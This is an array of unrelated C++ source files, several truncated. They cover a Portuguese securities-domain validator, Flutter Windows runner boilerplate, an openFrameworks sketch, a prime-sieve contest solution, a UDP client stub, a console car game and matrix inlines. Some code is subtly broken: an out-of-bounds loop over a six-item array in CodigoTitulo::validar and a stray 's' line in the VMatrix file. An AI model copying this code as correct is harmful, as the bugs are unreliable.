    "#include \"dominios.hpp\"\n#include <string>\n#include <regex>\n#include <cstdlib>\n\n//funcoes de assistencia\n\nbool isUpperCase(char caractere){\n\n    if(caractere < 'A' || caractere > 'Z'){\n        return 0;\n    }\n\n    return 1;\n\n}\n\nbool checkNome(string nomeTeste){\n\n    if(isUpperCase(nomeTeste[0])==0){\n        return 0;\n    }\n    if(nomeTeste.length()<3 || nomeTeste.length()>10){\n        return 0;\n    }\n\n    return 1;\n\n}\n\n//metodos da classe Percentual\n\nbool Percentual::validar(int valorTeste){\n\n    if(0 <= valorTeste && valorTeste <= 100){\n        return 1;\n    }\n    return 0;\n}\n\nvoid Percentual::setPercentual(int valor){\n    if( validar(valor) ){\n        this->valor = valor;\n    }\n}\n\n//metodos da classe Estado\n\nbool Estado::validar(std::string estadoTeste){\n\n    std::string estadosPossiveis[3] = {\"Previsto\", \"Liquidado\", \"Inadimplente\"};\n\n    for(int i = 0; i < 3; i++){\n\n        if(estadoTeste == estadosPossiveis[i]){\n            return 1;\n        }\n\n    }\n\n    return 0;\n\n}\n\nvoid Estado::setEstado(std::string tipoEstado){\n\n    if( validar(tipoEstado) ){\n        this->tipoEstado = tipoEstado;\n    }\n\n}\n\n//metodos da classe Dinheiro\n\nbool Dinheiro::validar(float valorTeste){\n\n    if(0<=valorTeste && valorTeste <= 1000000){\n        return 1;\n    }\n    return 0;\n\n}\n\nvoid Dinheiro::setDinheiro(float valor){\n\n    if( validar(valor) ){\n        this->valor = valor;\n    }\n\n}\n\n//metodos da classe Setor\n\nbool Setor::validar(std::string setorTeste){\n\n    std::string setoresPossiveis[10] = {\"Agricultura\", \"Constru\u00e7\u00e3o civil\", \"Energia\", \"Finan\u00e7as\", \"Imobili\u00e1rio\",\n    \"Papel e celulose\", \"Pecu\u00e1ria\", \"Qu\u00edmica e petroqu\u00edmica\", \"Metalurgia e siderurgia\", \"Minera\u00e7\u00e3o\"};\n\n    for(int i = 0; i < 10; i++){\n        if(setorTeste == setoresPossiveis[i]){\n            return 1;\n        }\n    }\n\n    return 0;\n\n}\n\nvoid Setor::setSetor(std::string nomeSetor){\n\n    if( validar(nomeSetor) ){\n        this->nomeSetor = nomeSetor;\n    }\n\n}\n\n//metodos da classe codPagamento\n\nbool codPagamento::validar(std::string codigoTeste){\n\n    if(codigoTeste.length() != 8){\n        return 0;\n    }\n\n    if(codigoTeste[0]<'1' || codigoTeste[0]>'9'){\n        return 0;\n    }\n\n    for(int i=0; i<8; i++){\n        if(isdigit(codigoTeste[i])== 0){\n            return 0;\n        }\n    }\n\nreturn 1;\n\n}\n\nvoid codPagamento::setCodPagamento(std::string codigo){\n\n    if( validar(codigo) ){\n        this->codigo = codigo;\n    }\n\n}\n\n//metodos da classe Nome\n\nbool Nome::validar(std::string nomeTeste){\n\n    int blankSpaceIndex;\n    int blankSpaceQuantity = 0;\n    std::string primeiroNome = \"\", sobreNome = \"\";\n\n    for (int i=0; i<nomeTeste.length();i++){ //loop para contar numero de espa\u00e7os em branco\n        if( isblank(nomeTeste[i]) ){\n            blankSpaceQuantity++;\n        }\n        if( isalpha(nomeTeste[i]) == 0 && nomeTeste[i] != ' '){\n            return 0;\n        }\n    }\n\n    switch(blankSpaceQuantity){\n\n        case 0:\n            return checkNome(nomeTeste);\n\n        case 1:\n            blankSpaceIndex = nomeTeste.find(' ');\n            primeiroNome.insert(0,nomeTeste,0,blankSpaceIndex);\n            sobreNome.append(nomeTeste,blankSpaceIndex+1);\n\n            return (checkNome(primeiroNome) && checkNome(sobreNome));\n\n        default:\n        return 0;\n\n    }\n\n}\n\nvoid Nome::setNome(std::string nome){\n\n        if(validar(nome)){\n            this-> nome = nome;\n        }\n\n}\n\n//metodos da classe CodigoTitulo\n\nbool CodigoTitulo::validar(std::string codigoTeste){\n\n    if(codigoTeste.length() != 11){\n        return 0;\n    }\n\n    std::string codigosPossiveis[6] = {\"CDB\", \"CRA\", \"CRI\", \"LCA\", \"LCI\", \"DEB\"};\n    std::string inicio = \"\";\n    std::string final = \"\";\n    bool valInicio=0, valFinal=1;\n\n    inicio.insert(0,codigoTeste,0,3);\n    final.append(codigoTeste,3);\n\n    for(int i=0;i<8;i++){\n        if(inicio == codigosPossiveis[i]){\n            valInicio = 1;\n        }\n    }\n\n    for(int i=0;i<8;i++){\n\n        if(isUpperCase(final[i]) == 0  && isdigit(final[i])==0){\n            valFinal = 0;\n        }\n    }\n\n    return (valInicio && valFinal);\n\n}\n\nvoid CodigoTitulo::setCodigoTitulo(std::string codigo){\n\n    if(validar(codigo)){\n        this->codigo = codigo;\n    }\n\n}\n\n//metodos da classe Data\n\nbool Data::validar(std::string DataTeste){\n\n    if( regex_match(DataTeste,regex(\"^\\\\d{2}[-]\\\\d{2}[-]\\\\d{4}$\")) == 0){\n        return 0;\n    }\n\n    int dia,mes,ano;\n    string temp;\n    bool anoBissexto;\n\n    temp.assign(DataTeste,0,2);\n    dia = atoi(temp.c_str());\n\n    temp.assign(DataTeste,3,2);\n    mes = atoi(temp.c_str());\n\n    temp.assign(DataTeste,6,4);\n    ano = atoi(temp.c_str());\n\n    if(dia<1 || dia>31){\n        return 0;\n    }\n\n    if(mes<1 || mes>12){\n        return 0;\n    }\n\n    if(ano<2000 || ano>2100){\n        return 0;\n    }\n\n    anoBissexto = ( (ano-2000)%4==0 )? true : false;\n\n    if(mes == 2){\n\n        if(anoBissexto){\n            return (dia <= 29);\n        } else {\n            return (dia <= 28);\n        }\n\n        return 1;\n    }\n\n    if(mes == 4 || mes == 6 || m",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hesabpay_gateway\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"ofApp.h\"\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::setup() {\r\n\r\n\tofSetFrameRate(25);\r\n\tofSetWindowTitle(\"openFrameworks\");\r\n\r\n\tofBackground(39);\r\n\tofNoFill();\r\n\tofEnableDepthTest();\r\n\r\n\tofColor color;\r\n\tthis->number_of_sphere = 70;\r\n\twhile (this->box_list.size() < this->number_of_sphere) {\r\n\r\n\t\tauto tmp_location = this->make_point(280, ofRandom(0, 50), ofRandom(360), ofRandom(360));\r\n\t\tauto radius = this->box_list.size() < 50 ? ofRandom(20, 60) : ofRandom(10, 20);\r\n\r\n\t\tbool flag = true;\r\n\t\tfor (int i = 0; i < this->box_list.size(); i++) {\r\n\r\n\t\t\tif (glm::distance(tmp_location, get<1>(this->box_list[i])) < get<2>(this->box_list[i]) + radius) {\r\n\r\n\t\t\t\tflag = false;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (flag) {\r\n\r\n\t\t\tcolor.setHsb(ofRandom(255), 255, 200);\r\n\t\t\tthis->box_list.push_back(make_tuple(color, tmp_location, radius));\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::update() {\r\n\r\n\tofSeedRandom(39);\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::draw() {\r\n\r\n\tthis->cam.begin();\r\n\tofRotateZ(ofGetFrameNum() * 0.77);\r\n\r\n\tfor (int i = 0; i < this->box_list.size(); i++) {\r\n\r\n\t\tauto color = get<0>(this->box_list[i]);\r\n\t\tauto location = get<1>(this->box_list[i]);\r\n\t\tauto radius = get<2>(this->box_list[i]);\r\n\r\n\t\tofPushMatrix();\r\n\t\tofTranslate(location);\r\n\r\n\t\tfor (int k = 0; k < 8; k++) {\r\n\r\n\t\t\tauto noise_seed = glm::vec3(ofRandom(1000), ofRandom(1000), ofRandom(1000));\r\n\t\t\tcolor.setHsb(int(color.getHue() + 32) % 255, 255, 255);\r\n\r\n\t\t\tfor (int m = 0; m < 200; m++) {\r\n\t\t\t\t\r\n\t\t\t\tofSetColor(color, ofMap(m, 0, 200, 32, 255));\r\n\r\n\t\t\t\tauto vertex = glm::vec3(\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.x, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.y, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.z, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85)\r\n\t\t\t\t);\r\n\r\n\t\t\t\tauto next = glm::vec3(\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.x, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.y, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.z, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85)\r\n\t\t\t\t);\r\n\r\n\t\t\t\tvertex = glm::normalize(vertex) * radius * 0.9;\r\n\t\t\t\tnext = glm::normalize(next) * radius * 0.9;\r\n\r\n\t\t\t\tofDrawLine(vertex, next);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tofPopMatrix();\r\n\t}\r\n\r\n\tthis->cam.end();\r\n\r\n\t/*\r\n\tint start = 250;\r\n\tif (ofGetFrameNum() > start) {\r\n\r\n\t\tostringstream os;\r\n\t\tos << setw(4) << setfill('0') << ofGetFrameNum() - start;\r\n\t\tofImage image;\r\n\t\timage.grabScreen(0, 0, ofGetWidth(), ofGetHeight());\r\n\t\timage.saveImage(\"image/cap/img_\" + os.str() + \".jpg\");\r\n\t\tif (ofGetFrameNum() - start >= 25 * 20) {\r\n\r\n\t\t\tstd::exit(1);\r\n\t\t}\r\n\t}\r\n\t*/\r\n}\r\n\r\n//--------------------------------------------------------------\r\nglm::vec3 ofApp::make_point(float R, float r, float u, float v) {\r\n\r\n\t// \u6570\u5b66\u30c7\u30c3\u30b5\u30f3\u6559\u5ba4 \u63cf\u3044\u3066\u697d\u3057\u3080\u6570\u5b66\u305f\u3061\u3000P.31\r\n\r\n\tu *= DEG_TO_RAD;\r\n\tv *= DEG_TO_RAD;\r\n\r\n\tauto x = (R + r * cos(u)) * cos(v);\r\n\tauto y = (R + r * cos(u)) * sin(v);\r\n\tauto z = r * sin(u);\r\n\r\n\treturn glm::vec3(x, y, z);\r\n}\r\n\r\n//--------------------------------------------------------------\r\nint main() {\r\n\r\n\tofSetupOpenGL(720, 720, OF_WINDOW);\r\n\tofRunApp(new ofApp());\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"DUBEN LAY LAY\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\r\n#include <ext/pb_ds/assoc_container.hpp>\r\n#include <ext/pb_ds/tree_policy.hpp>\r\n\r\nusing namespace std;\r\nusing namespace __gnu_pbds;\r\n\r\n#define ull unsigned long long int\r\n#define ld long double\r\n#define ll long long\r\n#define PI acos(-1)\r\n#define endl \"\\n\"\r\n#define all(x) x.begin(), x.end()\r\n#define fixed(n) cout << fixed << setprecision(n)\r\n#define loop(i, n) for (int i = 0; i < (int)n; i++)\r\n\r\nconst int OO = 0x3f3f3f3f;\r\nconst int N = 1e5 + 7;\r\nint dx[] = {1, -1, 0, 0};\r\nint dy[] = {0, 0, 1, -1};\r\n\r\nvoid Ahmed_Faraj()\r\n{\r\n    ios_base::sync_with_stdio(false);\r\n    cin.tie(nullptr);\r\n    cout.tie(nullptr);\r\n#ifndef ONLINE_JUDGE\r\n    freopen(\"input.txt\", \"r\", stdin);\r\n    freopen(\"output.txt\", \"w\", stdout);\r\n#endif\r\n}\r\n\r\n/*Solution*/\r\n\r\nll prime[N];\r\nvector<ll> ans;\r\nvoid sieve()\r\n{\r\n    for (int i = 0; i < N; i++)\r\n        prime[i] = 1;\r\n    prime[0] = prime[1] = 0;\r\n    for (int i = 4; i < N; i += 2)\r\n    {\r\n        prime[i] = 0;\r\n    }\r\n    for (int i = 3; i * i < N; i += 2)\r\n    {\r\n        if (prime[i])\r\n        {\r\n            for (int j = i * i; j < N; j += i + i)\r\n            {\r\n                prime[j] = 0;\r\n            }\r\n        }\r\n    }\r\n    for (int i = 0; i < N - 1; i++)\r\n    {\r\n        if(prime[i])\r\n            ans.push_back(i);\r\n    }\r\n}\r\n\r\nvoid solve()\r\n{\r\n    ll n;\r\n    cin >> n;\r\n    ll cnt = lower_bound(all(ans),n) - ans.begin();\r\n    if(prime[n]){\r\n        cnt++;\r\n    }\r\n    cnt++;\r\n    // cout << cnt << endl;\r\n    cout << pow(ceil(log2((long double)n)) / cnt, 1 / ceil(log2((long double)n))) << endl;\r\n}\r\n\r\nsigned main()\r\n{\r\n    Ahmed_Faraj();\r\n    sieve();\r\n    ll test = 1;\r\n    cin >> test;\r\n    while (test--)\r\n    {\r\n        solve();\r\n    }\r\n    return 0;\r\n}",
    "/*\n\n* Author:       Rick Candell (rick.candell@nist.gov)\n*\n* Organization: National Institute of Standards and Technology\n*               U.S. Department of Commerce\n* License:      Public Domain\n\n*/\n// rtclient.cpp : Defines the main() entry point for the console application.\n//\n\n#include <boost/system/config.hpp>\n#include <boost/program_options.hpp>\n#include <boost/interprocess/shared_memory_object.hpp>\n#include <boost/interprocess/mapped_region.hpp>\n\n#include <boost/array.hpp>\n#include <boost/asio.hpp>\n\nusing boost::asio::ip::udp;\n\n#define CMD_SHMEM_NAME (\"cmd_shmem\")\n\n#include <fstream>\n#include <iostream>\n#include <iomanip>\n#include <math.h>\n#include <utility>\n\n#include <boost/algorithm/string.hpp>\n\nusing boost::asio::ip::udp;\nusing namespace std;\n\nint main(int argc, char* argv[])\n{\n\t// program option variables\n\tunsigned serverPort = 17998;\n\tstring bindAddr = \"127.0.0.1\";\n\n\n\t// program options\n\tnamespace po = boost::program_options;\n\tpo::options_description desc(\"Allowed options\");\n\tdesc.add_options()\n\t\t(\"help,h\",\t\t\t\t\t\t\t\t\t\t\t\t\t\"print the help message\")\n\t\t(\"port,p\",\t\tpo::value<unsigned>(&serverPort),\t\t\t\"server port number\")\n\t\t(\"addr,a\",\t\tpo::value<string>(&bindAddr),\t\t\t\t\"bind address\")\n\t\t;\n\n\tpo::variables_map vm;\n\ttry\t{\n\t\tpo::store(po::parse_command_line(argc, argv, desc), vm);\n\t\tif (vm.count(\"help\"))\n\t\t{\n\t\t\tstd::cout << desc << std::endl;\n\t\t\treturn 0;\n\t\t}\n\n\t\tpo::notify(vm);\n\t}\n\tcatch (po::error& e) {\n\t\tstd::cerr << \"ERROR: \" << e.what() << std::endl << std::endl;\n\t\tstd::cerr << desc << std::endl;\n\t\treturn 0;\n\t}\n\n\t// set up the shared memory for the command messages to the ROS controller\n\tusing namespace boost::interprocess;\n\ttry\n\t{\n\t\tif (vm.count(\"x\"))\n\t\t{\n\t\t\tshared_memory_object msg_shm(open_only, CMD_SHMEM_NAME, read_write);\n\t\t\tmapped_region reg_msg(msg_shm, read_write);\n\t\t}\n\t}\n\tcatch (interprocess_exception & ex)\n\t{\n\t\tstd::cout << ex.what() << std::endl;\n\t\treturn 1;\n\t}\n\n\t// open UDP socket\n\n\n\t// wait for data\n\n\n\t// write data to shared memory\n\n\n\t// close UDP socket\n\t\n\n\treturn 0;\n}\n",
    "extern short int nSessionConsoleHeight;\r\nextern CarInfo UserCar;\r\nextern CarInfo EnemyCars[128];\r\nextern const int nEnemyCarArraySize;\r\n\r\nclass CarDodgeMain : CarDodgeCore \r\n{\r\nprivate:\r\n\tuint64_t nSessionPoints = 0;\r\n\tstd::chrono::duration<long double> nSessionTime;\r\n\tuint64_t nSessionLevel = 1;\r\n\tstd::chrono::milliseconds nSessionEnemyCarInterval = GetSessionLevelEnemyCarInterval();\r\n\tbool bPanelAlreadyUpdated = false;\r\n\r\n\t// UpdatePanelInfo - Updates panel info (points, time, etc)\r\n\tvoid UpdatePanelInfo() {\r\n\t\t// Set to colour of panel before anything\r\n\t\tcolour(sBorderColourFore, sBorderColourBack);\r\n\r\n\t\t// Render unchanging title/controls if not rendered already\r\n\t\tif (!bPanelAlreadyUpdated) {\r\n\t\t\t// Render unchanging title if not rendered already\r\n\t\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 3, 2);\r\n\t\t\tstd::cout << \"*************\";\r\n\t\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 3, 3);\r\n\t\t\tstd::cout << \"| Car Dodge |\";\r\n\t\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 3, 4);\r\n\t\t\tstd::cout << \"*************\";\r\n\r\n\t\t\t// Render unchanging controls if not rendered already\r\n\t\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 2, 13);\r\n\t\t\tstd::cout << \"|    __Controls__   |\";\r\n\t\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 2, 14);\r\n\t\t\tstd::cout << \"| Left:             |\";\r\n\t\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 2, 15);\r\n\t\t\tstd::cout << \"| Left Arrow/A Key  |\";\r\n\t\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 2, 16);\r\n\t\t\tstd::cout << \"| Right:            |\";\r\n\t\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 2, 17);\r\n\t\t\tstd::cout << \"| Right Arrow/D Key |\";\r\n\r\n\t\t\tbPanelAlreadyUpdated = true;\r\n\t\t}\r\n\r\n\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 3, 6);\r\n\t\tstd::cout << \"_______________\";\r\n\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 3, 7);\r\n\t\tstd::cout << \"Points: \" << nSessionPoints;\r\n\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 3, 8);\r\n\t\tstd::cout.write(std::string(nRightBorderWidth - 3, ' ').data(), nRightBorderWidth - 3);\r\n\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 3, 8);\r\n\t\tstd::cout << \"Time: \" << nSessionTime.count() << \" sec\";\r\n\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 3, 9);\r\n\t\tstd::cout << \"Level: \" << (nSessionLevel == 12 ? \"OMEGA\" : std::to_string(nSessionLevel));\r\n\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 3, 10);\r\n\t\tstd::cout << \"Interval Period: \" << nSessionEnemyCarInterval.count() << \"ms\";\r\n\t\tSetCursorPosition(nScreenWidth - nRightBorderWidth + 3, 11);\r\n\t\tstd::cout << \"_______________\";\r\n\r\n\t\t// Reset to global colours\r\n\t\tcolour(sColourGlobal, sColourGlobalBack);\r\n\r\n\t\treturn;\r\n\t}\r\n\r\n\t// DisplayUserLossScreen - Displays the loss screen after crashing into an enemy car.\r\n\t// Returns TRUE if user wants to play again, else returns FALSE if user wants to exit to main menu.\r\n\t//\r\n\tinline bool DisplayUserLossScreen() {\r\n\t\tcls();\r\n\t\tRenderBorders(sBorderColourFore, sBorderColourBack);\r\n\r\n\t\t// Draw borders around loss screen with fill\r\n\t\tcolour(YLW, RED);\r\n\t\tSetCursorPosition(nLeftBorderWidth, 3);\r\n\t\tstd::cout << std::string(nGameplayScreenWidth, '#');\r\n\t\tfor (int i = 4; i < 12; i++) {\r\n\t\t\tSetCursorPosition(nLeftBorderWidth, i);\r\n\t\t\tstd::cout << std::string(nGameplayScreenWidth, ' ');\r\n\t\t}\r\n\t\tSetCursorPosition(nLeftBorderWidth, 12);\r\n\t\tstd::cout << std::string(nGameplayScreenWidth, '#');\r\n\t\t\r\n\t\t// Title\r\n\t\tSetCursorPosition(nLeftBorderWidth, 5);\r\n\t\tcolour(WHT, RED);\r\n\t\tstd::cout << ULINE_STR << CentreTextCarDodge(\"You crashed!\") << std::string((nGameplayScreenWidth - 12) / 2, ' ') << NOULINE_STR;\r\n\t\tcolour(sColourGlobal, RED);\r\n\r\n\t\t//                           //\r\n\t\t// Display other stats \\/ \\/ //\r\n\t\t//                           //\r\n\r\n\t\tSetCursorPosition(nLeftBorderWidth, 7);\r\n\t\tstd::cout << CentreTextCarDodge(\"Elapsed Time: \", 22 + std::to_string(nSessionTime.count()).length());\r\n\t\tcolour(BLU, RED);\r\n\t\tstd::cout << std::to_string(nSessionTime.count()) << \" seconds\";\r\n\t\tcolour(sColourGlobal, RED);\r\n\r\n\t\tSetCursorPosition(nLeftBorderWidth, 8);\r\n\t\tstd::cout << CentreTextCarDodge(\"Final Score: \", 13 + std::to_string(nSessionPoints).length() + std::string(nSessionPoints > GetCurrentHighScore() ? \" (-- NEW HIGH SCORE --)\" : \"\").length());\r\n\t\tcolour(BLU, RED);\r\n\t\tstd::cout << std::to_string(nSessionPoints);\r\n\t\tRandomColourOutput(std::string(nSessionPoints > GetCurrentHighScore() ? \" (-- NEW HIGH SCORE --)\" : \"\"), RED);\r\n\t\tcolour(sColourGlobal, RED);\r\n\r\n\t\tSetCursorPosition(nLeftBorderWidth, 9);\r\n\t\tstd::cout << CentreTextCarDodge(\"Final Level: \", 13 + std::to_string(nSessionLevel).length() + std::string(nSessionLevel == 12 ? \" (OMEGA Level)\" : \"\").length());\r\n\t\tcolour(BLU, RED);\r\n\t\tstd::cout << std::to_string(nSessionLevel) + std::string(nSessionLevel == 12 ? \" (OMEGA Level)\" : \"\");\r\n\t\tcolour(sColourGlobal, RED);\r\n\r\n\t\tSetCursorPosition(nLeftBorderWidth, 10);\r\n\t\tstd::cout << CentreTextCarDodge(\"Final Interval Period: \", 25 + std::to_string(nSessionEnemyCarInterval.count()).length()",
    "#include \"VMatrix.hpp\"\r\ns\r\n//-----------------------------------------------------------------------------\r\n// VMatrix inlines.\r\n//-----------------------------------------------------------------------------\r\ninline VMatrix::VMatrix()\r\n{\r\n}\r\n\r\ninline VMatrix::VMatrix(\r\n\tfloat m00, float m01, float m02, float m03,\r\n\tfloat m10, float m11, float m12, float m13,\r\n\tfloat m20, float m21, float m22, float m23,\r\n\tfloat m30, float m31, float m32, float m33)\r\n{\r\n\tInit(\r\n\t\tm00, m01, m02, m03,\r\n\t\tm10, m11, m12, m13,\r\n\t\tm20, m21, m22, m23,\r\n\t\tm30, m31, m32, m33\r\n\t);\r\n}\r\n\r\n\r\ninline VMatrix::VMatrix(const matrix3x4_t& matrix3x4)\r\n{\r\n\tInit(matrix3x4);\r\n}\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Creates a matrix where the X axis = forward\r\n// the Y axis = left, and the Z axis = up\r\n//-----------------------------------------------------------------------------\r\ninline VMatrix::VMatrix(const Vector& xAxis, const Vector& yAxis, const Vector& zAxis)\r\n{\r\n\tInit(\r\n\t\txAxis.x, yAxis.x, zAxis.x, 0.0f,\r\n\t\txAxis.y, yAxis.y, zAxis.y, 0.0f,\r\n\t\txAxis.z, yAxis.z, zAxis.z, 0.0f,\r\n\t\t0.0f, 0.0f, 0.0f, 1.0f\r\n\t);\r\n}\r\n\r\n\r\ninline void VMatrix::Init(\r\n\tfloat m00, float m01, float m02, float m03,\r\n\tfloat m10, float m11, float m12, float m13,\r\n\tfloat m20, float m21, float m22, float m23,\r\n\tfloat m30, float m31, float m32, float m33\r\n)\r\n{\r\n\tm[0][0] = m00;\r\n\tm[0][1] = m01;\r\n\tm[0][2] = m02;\r\n\tm[0][3] = m03;\r\n\r\n\tm[1][0] = m10;\r\n\tm[1][1] = m11;\r\n\tm[1][2] = m12;\r\n\tm[1][3] = m13;\r\n\r\n\tm[2][0] = m20;\r\n\tm[2][1] = m21;\r\n\tm[2][2] = m22;\r\n\tm[2][3] = m23;\r\n\r\n\tm[3][0] = m30;\r\n\tm[3][1] = m31;\r\n\tm[3][2] = m32;\r\n\tm[3][3] = m33;\r\n}\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Initialize from a 3x4\r\n//-----------------------------------------------------------------------------\r\ninline void VMatrix::Init(const matrix3x4_t& matrix3x4)\r\n{\r\n\tmemcpy(m, matrix3x4.Base(), sizeof(matrix3x4_t));\r\n\r\n\tm[3][0] = 0.0f;\r\n\tm[3][1] = 0.0f;\r\n\tm[3][2] = 0.0f;\r\n\tm[3][3] = 